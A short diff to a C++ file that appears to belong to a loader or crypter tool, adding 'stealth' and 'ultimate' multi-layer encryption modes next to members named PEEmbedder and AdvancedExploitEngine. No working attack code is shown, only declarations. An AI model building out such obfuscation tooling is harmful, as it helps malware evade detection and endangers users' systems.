@@ -40,6 +40,7 @@
 #include "cross_platform_encryption.h"
 #include "enhanced_loader_utils.h"
 #include "enhanced_encryption_system.h"
+#include "ultimate_encryption_integration.h"
 
 #pragma comment(lib, "ole32.lib")
 #pragma comment(lib, "crypt32.lib")
@@ -98,7 +99,10 @@ enum EncryptionType {
     ENCRYPT_XOR = 1,            // XOR encryption (simple but effective)
     ENCRYPT_AES = 2,            // AES-256 encryption
     ENCRYPT_CHACHA20 = 3,       // ChaCha20 encryption (modern, secure)
-    ENCRYPT_TRIPLE = 4          // Triple encryption (XOR -> AES -> ChaCha20)
+    ENCRYPT_TRIPLE = 4,         // Triple encryption (XOR -> AES -> ChaCha20)
+    ENCRYPT_STEALTH_TRIPLE = 5, // Stealth triple encryption (random order)
+    ENCRYPT_BIG_DECIMAL = 6,    // Big decimal string conversion
+    ENCRYPT_ULTIMATE = 7        // Ultimate encryption (all methods combined)
 };
 
 // Function to kill running instances before build
@@ -1549,6 +1553,7 @@ public:
     PEEmbedder peEmbedder;
     AdvancedExploitEngine exploitEngine;
     EmbeddedCompiler embeddedCompiler;
+    UltimateEncryptionIntegration ultimateEncryption;
     EnhancedEncryptionSystem enhancedEncryption;
 
     struct CompanyProfile {
